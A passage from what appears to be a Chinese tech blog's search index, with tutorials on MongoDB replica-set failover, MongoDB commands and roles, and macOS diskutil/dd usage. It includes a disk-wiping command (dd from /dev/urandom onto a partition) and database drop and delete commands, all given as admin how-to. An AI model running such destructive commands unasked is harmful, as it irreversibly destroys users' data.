class="string">&quot;stateStr&quot;</span> : <span class="string">&quot;SECONDARY&quot;</span>, <span class="regexp">//</span>处于secondary状态</span><br><span class="line">        ···     <span class="regexp">//</span>省略部分内容</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;_id&quot;</span> : <span class="number">2</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span> : <span class="string">&quot;10.0.0.102:27017&quot;</span>,</span><br><span class="line">            <span class="string">&quot;health&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;state&quot;</span> : <span class="number">2</span>,</span><br><span class="line">            <span class="string">&quot;stateStr&quot;</span> : <span class="string">&quot;SECONDARY&quot;</span>,</span><br><span class="line">        ···     <span class="regexp">//</span>省略部分内容</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">anthony:PRIMARY&gt;            <span class="regexp">//</span>此时节点状态已经发生转变</span><br></pre></td></tr></table></figure><h3 id="5-节点管理-在primary上做"><a href="#5-节点管理-在primary上做" class="headerlink" title="5.节点管理(在primary上做)"></a>5.节点管理(在primary上做)</h3><h4 id="1-添加节点"><a href="#1-添加节点" class="headerlink" title="1. 添加节点"></a>1. 添加节点</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">rs.<span class="built_in">add</span>(<span class="string">&quot;10.0.0.103:27017&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="2-删除节点"><a href="#2-删除节点" class="headerlink" title="2. 删除节点"></a>2. 删除节点</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">rs.<span class="built_in">remove</span>(<span class="string">&quot;10.0.0.103:27017&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="6-故障转移切换"><a href="#6-故障转移切换" class="headerlink" title="6.故障转移切换"></a>6.故障转移切换</h3><h4 id="1-模拟主节点损坏"><a href="#1-模拟主节点损坏" class="headerlink" title="1. 模拟主节点损坏"></a>1. 模拟主节点损坏</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">ps aux | grep  mongod     <span class="regexp">//</span>查询本地的节点的进程号</span><br><span class="line">kill -<span class="number">9</span> <span class="number">40882</span>             <span class="regexp">//</span>杀死主节点进程</span><br></pre></td></tr></table></figure><h4 id="2-查看节点状态"><a href="#2-查看节点状态" class="headerlink" title="2. 查看节点状态"></a>2. 查看节点状态</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">anthony:SECONDARY&gt; rs.status()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;set&quot;</span> : <span class="string">&quot;anthony&quot;</span>,</span><br><span class="line">    <span class="string">&quot;date&quot;</span> : ISODate(<span class="string">&quot;2020-07-14T15:21:21.426Z&quot;</span>),</span><br><span class="line">    <span class="string">&quot;myState&quot;</span> : <span class="number">2</span>,</span><br><span class="line">    <span class="string">&quot;term&quot;</span> : NumberLong(<span class="number">2</span>),</span><br><span class="line">    <span class="string">&quot;syncingTo&quot;</span> : <span class="string">&quot;10.0.0.102:27017&quot;</span>,</span><br><span class="line">    <span class="string">&quot;syncSourceHost&quot;</span> : <span class="string">&quot;10.0.0.102:27017&quot;</span>,</span><br><span class="line">    <span class="string">&quot;syncSourceId&quot;</span> : <span class="number">2</span>,</span><br><span class="line">           ···   <span class="regexp">//</span>省略部分内容</span><br><span class="line">    <span class="string">&quot;members&quot;</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;_id&quot;</span> : <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span> : <span class="string">&quot;10.0.0.100:27017&quot;</span>,</span><br><span class="line">            <span class="string">&quot;health&quot;</span> : <span class="number">0</span>,             <span class="regexp">//</span>健康值为<span class="number">0</span>，处于停机状态</span><br><span class="line">            <span class="string">&quot;state&quot;</span> : <span class="number">8</span>,</span><br><span class="line">            <span class="string">&quot;stateStr&quot;</span> : <span class="string">&quot;(not reachable/healthy)&quot;</span>,</span><br><span class="line">           ···   <span class="regexp">//</span>省略部分内容</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;_id&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span> : <span class="string">&quot;10.0.0.101:27017&quot;</span>,</span><br><span class="line">            <span class="string">&quot;health&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;state&quot;</span> : <span class="number">2</span>,</span><br><span class="line">            <span class="string">&quot;stateStr&quot;</span> : <span class="string">&quot;SECONDARY&quot;</span>,</span><br><span class="line">            ···   <span class="regexp">//</span>省略部分内容</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;_id&quot;</span> : <span class="number">2</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span> : <span class="string">&quot;10.0.0.102:27017&quot;</span>,</span><br><span class="line">            <span class="string">&quot;health&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;state&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;stateStr&quot;</span> : <span class="string">&quot;PRIMARY&quot;</span>,</span><br><span class="line">            ···    <span class="regexp">//</span>省略部分内容</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-主动切换主从状态-在primary上做"><a href="#7-主动切换主从状态-在primary上做" class="headerlink" title="7.主动切换主从状态(在primary上做)"></a>7.主动切换主从状态(在primary上做)</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">rs.<span class="keyword">freeze</span>(<span class="number">30</span>)      //暂停<span class="number">30</span>s不参与选举</span><br><span class="line">rs.stepDown(<span class="number">60</span>,<span class="number">30</span>)   //交出主节点位置，维持从节点状态不少于<span class="number">60</span>秒，等待<span class="number">30</span>秒使主节点和从节点日志同步</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> MongoDB </category>
          
          <category> 命令 </category>
          
          <category> 高级功能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Services </tag>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB总结</title>
      <link href="/MongoDB%E6%80%BB%E7%BB%93.htm"/>
      <url>/MongoDB%E6%80%BB%E7%BB%93.htm</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB总结"><a href="#MongoDB总结" class="headerlink" title="MongoDB总结"></a>MongoDB总结</h1><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">show databases;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> databasename;</span><br><span class="line"></span><br><span class="line"><span class="keyword">db</span>.dropDatabase();</span><br><span class="line"></span><br><span class="line">show collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">db</span>.createCollection(&#x27;collectionname&#x27;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">db</span>.collectionname.<span class="keyword">drop</span>();</span><br></pre></td></tr></table></figure><h3 id="CURD"><a href="#CURD" class="headerlink" title="CURD"></a>CURD</h3><h4 id="增："><a href="#增：" class="headerlink" title="增："></a>增：</h4><p>集合存在则直接插入数据，不存在则隐式创建</p><p>collections为集合名</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">db<span class="selector-class">.collection</span><span class="selector-class">.insert</span>(&#123;name:<span class="string">&quot;jack&quot;</span>&#125;)<span class="comment">//单个JSON插入</span></span><br><span class="line">db<span class="selector-class">.collection</span><span class="selector-class">.insert</span>(<span class="selector-attr">[&#123;name:<span class="string">&quot;jack&quot;</span>&#125;.&#123;name:<span class="string">&quot;tom&quot;</span>&#125;]</span>)<span class="comment">//多个JSON插入</span></span><br><span class="line"><span class="function"><span class="title">for</span><span class="params">(var i =<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span></span>&#123;</span><br><span class="line">db<span class="selector-class">.collection</span><span class="selector-class">.insert</span>(&#123;name:<span class="string">&quot;jack&quot;</span>&#125;)</span><br><span class="line">&#125;<span class="comment">//快速插入多个数据</span></span><br></pre></td></tr></table></figure><h4 id="改"><a href="#改" class="headerlink" title="改:"></a>改:</h4><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(条件,新数据[,是否新增,是否修改多条数据])</span><br><span class="line">//是否新增<span class="built_in">：true</span>则为插入，默认flase为不插入</span><br><span class="line">//是否修改多条：匹配到的数据都修改，默<span class="built_in">认true</span>为是<span class="built_in">，false</span>为否</span><br><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(<span class="built_in">&#123;name</span>:<span class="string">&quot;tom&quot;</span>&#125;,<span class="built_in">&#123;name</span>:<span class="string">&quot;saily&quot;</span>&#125;<span class="built_in">,false</span><span class="built_in">,true</span>)</span><br><span class="line">//这样子为将tom的那条数据替换成<span class="built_in">&#123;name</span>:<span class="string">&quot;saily&quot;</span>&#125;，默认为替换不是修改</span><br></pre></td></tr></table></figure><p><strong>下面运算符可在新数据里面使用</strong></p><table><thead><tr><th>运算符</th><th>作用</th></tr></thead><tbody><tr><td>$inc</td><td>递增</td></tr><tr><td>$rename</td><td>重命名列</td></tr><tr><td>$set</td><td>修改列值</td></tr><tr><td>$unset</td><td>删除列</td></tr></tbody></table><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">//<span class="variable">$inc</span>使用，将age增加<span class="number">3</span></span><br><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(<span class="built_in">&#123;name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;<span class="variable">$inc:</span>&#123;age: <span class="number">3</span>&#125;&#125;)</span><br><span class="line">//<span class="variable">$inc</span>使用，将age减少<span class="number">3</span></span><br><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(<span class="built_in">&#123;name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;<span class="variable">$inc:</span>&#123;age: -<span class="number">3</span>&#125;&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">//<span class="variable">$rename</span>使用，修<span class="built_in">改name</span>命名为uname</span><br><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(<span class="built_in">&#123;name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;<span class="variable">$rename:</span><span class="built_in">&#123;name</span>:<span class="string">&quot;uname&quot;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">//<span class="variable">$set</span>使用，将修<span class="built_in">改name</span>为saily</span><br><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(<span class="built_in">&#123;name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;<span class="variable">$set:</span><span class="built_in">&#123;name</span>:<span class="string">&quot;saily&quot;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">//<span class="variable">$unset</span>使用，将age字段删除<span class="built_in">,true</span>为删除</span><br><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(<span class="built_in">&#123;name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;<span class="variable">$unset:</span>&#123;age:true&#125;&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//一次性写多个修改器</span></span><br><span class="line">db.collection.<span class="title function_ invoke__">update</span>(&#123;<span class="attr">name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;</span><br><span class="line"><span class="variable">$inc</span>:&#123;<span class="attr">age</span>: <span class="number">3</span>&#125;,</span><br><span class="line"><span class="variable">$set</span>:&#123;<span class="attr">name</span>:<span class="string">&quot;saily&quot;</span>&#125;,</span><br><span class="line"><span class="variable">$rename</span>:&#123;<span class="attr">name</span>:<span class="string">&quot;uname&quot;</span>&#125;,</span><br><span class="line"><span class="variable">$unset</span>:&#123;<span class="attr">age</span>:<span class="literal">true</span>&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="查："><a href="#查：" class="headerlink" title="查："></a>查：</h4><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">db.collection.<span class="built_in">find</span>(条件[,查询的列])</span><br><span class="line"><span class="comment">//格式化查询文档</span></span><br><span class="line">db.collection.<span class="built_in">find</span>().pretty();</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询age为6的数据</span></span><br><span class="line">db.collection.<span class="built_in">find</span>(&#123;age:<span class="number">6</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询age为6和sex为male的数据</span></span><br><span class="line">db.collection.<span class="built_in">find</span>(&#123;age:<span class="number">6</span>,sex:<span class="string">&quot;male&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询的列 表示 结果筛选</span></span><br><span class="line"><span class="comment">//查询name为tom只显示age字段</span></span><br><span class="line">db.collection.<span class="built_in">find</span>(&#123;<span class="built_in">name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;age:<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询name为tom除了age字段都显示</span></span><br><span class="line">db.collection.<span class="built_in">find</span>(&#123;<span class="built_in">name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;age:<span class="number">0</span>&#125;)</span><br></pre></td></tr></table></figure><h4 id="删："><a href="#删：" class="headerlink" title="删："></a>删：</h4><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">db<span class="selector-class">.collection</span><span class="selector-class">.remove</span>(条件<span class="selector-attr">[,是否删除一条]</span>)</span><br><span class="line"><span class="comment">//删除集合中所有文档</span></span><br><span class="line">db<span class="selector-class">.collection</span><span class="selector-class">.remove</span>(&#123;&#125;)</span><br><span class="line"><span class="comment">//是否删除一条，只删除一条为true，默认为否删除全部false</span></span><br></pre></td></tr></table></figure><h3 id="排序："><a href="#排序：" class="headerlink" title="排序："></a>排序：</h3><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="comment">//JSON数据里面根据键值排序，键为字段名，值为1则升序排序，值为-1则为降序排序</span></span><br><span class="line"><span class="keyword">db</span>.collectionname.find().<span class="keyword">sort</span>(JSON数据)</span><br><span class="line"></span><br><span class="line"><span class="comment">//年龄按降序排序</span></span><br><span class="line"><span class="keyword">db</span>.<span class="keyword">test</span>.find().<span class="keyword">sort</span>(&#123;age: -1&#125;);</span><br></pre></td></tr></table></figure><h3 id="Limit与Skip方法："><a href="#Limit与Skip方法：" class="headerlink" title="Limit与Skip方法："></a>Limit与Skip方法：</h3><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">db<span class="selector-class">.collectionname</span><span class="selector-class">.find</span>()<span class="selector-class">.sort</span>()<span class="selector-class">.skip</span>(数字)<span class="selector-class">.limit</span>(数字);</span><br><span class="line"><span class="comment">//skip跳过指定数量文档（可选），limit限制查询的数量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//降序查询2条数据</span></span><br><span class="line">db<span class="selector-class">.test</span><span class="selector-class">.find</span>()<span class="selector-class">.sort</span>(&#123;age:-<span class="number">1</span>&#125;)<span class="selector-class">.limit</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//降序查询2条而且跳过2条数据</span></span><br><span class="line">db<span class="selector-class">.test</span><span class="selector-class">.find</span>()<span class="selector-class">.sort</span>(&#123;age:-<span class="number">1</span>&#125;)<span class="selector-class">.skip</span>(<span class="number">2</span>)<span class="selector-class">.limit</span>(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><h3 id="聚合查询："><a href="#聚合查询：" class="headerlink" title="聚合查询："></a>聚合查询：</h3><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">db.collectionname.aggregate([</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;管道:&#123;表达式&#125;</span><span class="language-xml">&#125;</span></span><br><span class="line"><span class="language-xml">...</span></span><br><span class="line"><span class="language-xml">])</span></span><br></pre></td></tr></table></figure><p><strong>常用管道</strong></p><table><thead><tr><th>方法</th><th>作用</th></tr></thead><tbody><tr><td>$group</td><td>将集合中的文档分组，用于统计结果</td></tr><tr><td>$match</td><td>过滤数据，只要输出符合条件的文档</td></tr><tr><td>$sort​</td><td>聚合数据进一步排序</td></tr><tr><td>$skip</td><td>跳过指定的文档数</td></tr><tr><td>$limit</td><td>限制集合数据返回文档数</td></tr><tr><td>…</td><td>…</td></tr></tbody></table><p><strong>常用表达式</strong></p><table><thead><tr><th align="left">方法</th><th>作用</th><th>用法</th></tr></thead><tbody><tr><td align="left">$sum</td><td>总和</td><td>$sum:1 同count表示统计</td></tr><tr><td align="left">$avg</td><td>平均</td><td></td></tr><tr><td align="left">$min</td><td>最小值</td><td></td></tr><tr><td align="left">$max</td><td>最大值</td><td></td></tr><tr><td align="left">…</td><td>…</td><td>…</td></tr></tbody></table><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>统计sex的总人数</span><br><span class="line">db.test.aggregate([</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$group</span>:&#123;</span><br><span class="line">_id: <span class="string">&quot;$sex&quot;</span>,<span class="regexp">//</span>按照sex列的顺序分组</span><br><span class="line">rs:  &#123;<span class="variable">$sum</span>:<span class="number">1</span>&#125;<span class="regexp">//</span>rs为统计总和的结果</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">])</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//统计所有人数的平均年龄</span></span><br><span class="line">db.test.<span class="title function_ invoke__">aggregate</span>([</span><br><span class="line">&#123;<span class="variable">$group</span>:&#123;</span><br><span class="line"><span class="attr">_id</span>: <span class="literal">null</span>,</span><br><span class="line"><span class="attr">totalNum</span>:  &#123;<span class="variable">$sum</span>: <span class="number">1</span>&#125;,</span><br><span class="line"><span class="attr">avgAge</span>: &#123;<span class="variable">$avg</span>: <span class="string">&quot;<span class="subst">$age</span>&quot;</span>&#125;</span><br><span class="line">&#125;&#125;</span><br><span class="line">])</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//查询每个sex的人数，按人数升序排序</span></span><br><span class="line">db.test.<span class="title function_ invoke__">aggregate</span>([</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$group</span>:&#123;</span><br><span class="line"><span class="attr">_id</span>: <span class="string">&quot;<span class="subst">$sex</span>&quot;</span>,</span><br><span class="line"><span class="attr">totalNum</span>: &#123;<span class="variable">$sum</span>:<span class="number">1</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="variable">$sort</span>:&#123;<span class="attr">totalNum</span>:<span class="number">1</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">])</span><br></pre></td></tr></table></figure><h3 id="索引："><a href="#索引：" class="headerlink" title="索引："></a>索引：</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建索引语法</span></span><br><span class="line">db<span class="selector-class">.collectionname</span><span class="selector-class">.createIndex</span>(待创建索引的列<span class="selector-attr">[,额外选项]</span>)</span><br><span class="line"><span class="comment">//待创建索引的列： &#123;键:1,...,键:-1&#125; 1为按升序创建索引，-1位按降序创建索引</span></span><br><span class="line"><span class="comment">//额外选项：设置索引的名称或者唯一索引等 &#123;name:indexname,unique:列名&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//删除索引语法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//全部删除</span></span><br><span class="line">db<span class="selector-class">.collectionname</span><span class="selector-class">.dropIndexes</span>()</span><br><span class="line"><span class="comment">//部分删除</span></span><br><span class="line">db<span class="selector-class">.collectionname</span><span class="selector-class">.dropIndex</span>(<span class="string">&#x27;索引名&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看索引语法</span></span><br><span class="line">db<span class="selector-class">.collectionname</span><span class="selector-class">.getIndexes</span>()</span><br></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建多个索引</span></span><br><span class="line">db.collectionname.create<span class="constructor">Index(&#123;<span class="params">name</span>:1,<span class="params">age</span>:1&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建唯一索引</span></span><br><span class="line">db.collectionname.create<span class="constructor">Index(&#123;<span class="params">name</span>:1&#125;,&#123;<span class="params">unique</span>:<span class="params">age</span>&#125;)</span></span><br></pre></td></tr></table></figure><h3 id="分析索引："><a href="#分析索引：" class="headerlink" title="分析索引："></a>分析索引：</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">db.collectionname.find().explain(<span class="string">&#x27;executionStats&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>COLLSCAN 全表扫描</span><br><span class="line"><span class="regexp">//</span>IXSCAN 索引扫描</span><br><span class="line"><span class="regexp">//</span>FETCH 根据索引去检索指定的document</span><br></pre></td></tr></table></figure><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/IMG_0512-6029409.jpg" alt="IMG_0512"></p><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="comment">//未添加索引寻找</span></span><br><span class="line">db.test.<span class="built_in">find</span>(&#123;<span class="built_in">name</span>:<span class="string">&quot;tom&quot;</span>&#125;).explain(<span class="string">&#x27;executionStats&#x27;</span>);</span><br><span class="line"><span class="comment">//添加索引寻找</span></span><br><span class="line">db.test.<span class="built_in">find</span>(&#123;<span class="built_in">name</span>:<span class="string">&quot;tom&quot;</span>&#125;).explain(<span class="string">&#x27;executionStats&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="权限机制："><a href="#权限机制：" class="headerlink" title="权限机制："></a>权限机制：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">admin</span>;</span><br><span class="line">db.<span class="title function_ invoke__">createUser</span>(&#123;</span><br><span class="line"><span class="string">&quot;user&quot;</span>: <span class="string">&quot;huangjiahui&quot;</span>,</span><br><span class="line"><span class="string">&quot;pwd&quot;</span>: <span class="string">&quot;huangjiahui&quot;</span>,</span><br><span class="line"><span class="attr">roles</span>:[&#123;</span><br><span class="line"><span class="attr">role</span>: <span class="string">&quot;readWrite&quot;</span>,</span><br><span class="line">  <span class="attr">db</span>:<span class="string">&quot;huangjiahui&quot;</span></span><br><span class="line">&#125;]</span><br><span class="line">&#125;)；</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line">db.<span class="title function_ invoke__">createUser</span>(&#123;</span><br><span class="line"><span class="string">&quot;user&quot;</span>: <span class="string">&quot;账号&quot;</span>,</span><br><span class="line"><span class="string">&quot;pwd&quot;</span>: <span class="string">&quot;密码&quot;</span>,</span><br><span class="line"><span class="attr">roles</span>:[&#123;</span><br><span class="line"><span class="attr">role</span>: <span class="string">&quot;角色&quot;</span>,</span><br><span class="line">  <span class="attr">db</span>:<span class="string">&quot;所属数据库&quot;</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line"><span class="attr">role</span>: <span class="string">&quot;readWrite&quot;</span>,</span><br><span class="line">  <span class="attr">db</span>:<span class="string">&quot;zdnfcj&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line">]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//指定某个数据库创建用户，要到当下的数据库下创建用户</span></span><br><span class="line"><span class="comment">//admin下的system.users集合能看到所有用户</span></span><br></pre></td></tr></table></figure><blockquote><p>#角色种类</p><p>超级用户角色：root</p><p>数据库用户角色：read、readWrite</p><p>数据库管理角色：dbAdmin、userAdmin</p><p>集群管理角色：clusterAdmin、clusterManager、clusterMonitor、hostManager</p><p>备份恢复角色：backup、restore</p><p>所有数据库角色：readAnyDatabase、readWriteAnyDatabase、userAdminAnyDatabase、dbAdminAnyDatabase</p></blockquote><p><strong>通过root登录</strong></p><ul><li>mongo ip:port/database -u user -p pwd</li><li>先登录 mongo，选择admin数据库，db.auth(user,pwd)</li></ul><h3 id="备份还原"><a href="#备份还原" class="headerlink" title="备份还原:"></a>备份还原:</h3><p><strong>备份</strong></p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">mongodump -h -port -u -p -d -o</span><br><span class="line"></span><br><span class="line">//语法说明</span><br><span class="line"><span class="deletion">-hhost ip</span></span><br><span class="line"><span class="deletion">-portport</span></span><br><span class="line"><span class="deletion">-uuser</span></span><br><span class="line"><span class="deletion">-ppwd</span></span><br><span class="line"><span class="deletion">-ddatabase</span></span><br><span class="line"><span class="deletion">-oopen./xxx/备份路径文件夹</span></span><br></pre></td></tr></table></figure><p><strong>还原</strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">mongorestore -h -port -u -<span class="selector-tag">p</span> -d <span class="attr">--drop</span> 备份数据目录</span><br><span class="line"></span><br><span class="line">-d 不写则还原全部数据</span><br><span class="line"><span class="attr">--drop</span>  先删除数据库再导入</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> MongoDB </category>
          
          <category> 命令 </category>
          
          <category> 使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Services </tag>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Diskutil工具集使用</title>
      <link href="/diskutil.htm"/>
      <url>/diskutil.htm</url>
      
        <content type="html"><![CDATA[<h1 id="Diskutil"><a href="#Diskutil" class="headerlink" title="Diskutil"></a>Diskutil</h1><p>在Mac OS系统下不需要安装任何第三方软件，可以很方便地用自带的dd命令将iso镜像写入u盘。</p><p>操作如下：</p><p>1、找出U盘挂载的路径，使用如下命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">diskutil list</span><br></pre></td></tr></table></figure><p>2、将U盘unmount（将N替换为挂载路径）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">diskutil unmount Disk /dev/disk[N]</span><br></pre></td></tr></table></figure><p>3、写入U盘：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">dd</span> <span class="keyword">if</span>=iso路径 of=/dev/rdisk[N] bs=1m  </span><br></pre></td></tr></table></figure><p>rdisk 中加入r可以让写入速度加快</p><h3 id="将u盘备份到iso镜像"><a href="#将u盘备份到iso镜像" class="headerlink" title="将u盘备份到iso镜像"></a>将u盘备份到iso镜像</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">dd</span> <span class="keyword">if</span>=/dev/rdisk[N] of= iso路径 bs=1m</span><br></pre></td></tr></table></figure><p>除此之外，dd命令还有以下作用：</p><h3 id="销毁磁盘数据"><a href="#销毁磁盘数据" class="headerlink" title="销毁磁盘数据"></a>销毁磁盘数据</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/urandom of=/dev/hda1</span><br></pre></td></tr></table></figure><p>注意：利用随机的数据填充硬盘，在某些必要的场合可以用来销毁数据。</p><h3 id="测试硬盘的读写速度"><a href="#测试硬盘的读写速度" class="headerlink" title="测试硬盘的读写速度"></a>测试硬盘的读写速度</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero bs=1024 count=1000000 of=/root/1Gb.file</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/root/1Gb.file bs=64k | <span class="built_in">dd</span> of=/dev/null</span><br></pre></td></tr></table></figure><p>通过以上两个命令输出的命令执行时间，可以计算出硬盘的读、写速度。</p>]]></content>
      
      
      <categories>
          
          <category> MacOs </category>
          
          <category> Service </category>
          
          <category> Diskutil </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Service </tag>
            
            <tag> MacOs </tag>
            
            <tag> Diskutil </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript-data_tructures_and_algorithms</title>
      <link href="/JavaScript%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E6%8F%8F%E8%BF%B0.htm"/>
      <url>/JavaScript%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E6%8F%8F%E8%BF%B0.htm</url>
      
        <content type="html"><![CDATA[<h1 id="data-tructures-and-algorithms-for-JavaScript"><a href="#data-tructures-and-algorithms-for-JavaScript" class="headerlink" title="data tructures and algorithms for JavaScript"></a>data tructures and algorithms for JavaScript</h1><h4 id="arithmetic-operation"><a href="#arithmetic-operation" class="headerlink" title="arithmetic operation"></a>arithmetic operation</h4><p>精度问题：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">3</span>+<span class="number">1.1</span>)<span class="comment">//输出4.1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">3</span>*<span class="number">1.1</span>)<span class="comment">//输出3.3000000000000003</span></span><br></pre></td></tr></table></figure><p>如果计算精度不必像上面那样精确，可以格式化为固定精度：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">print</span>((<span class="number">3</span>*<span class="number">1.1</span>).<span class="title function_">toFixed</span>(<span class="number">2</span>))<span 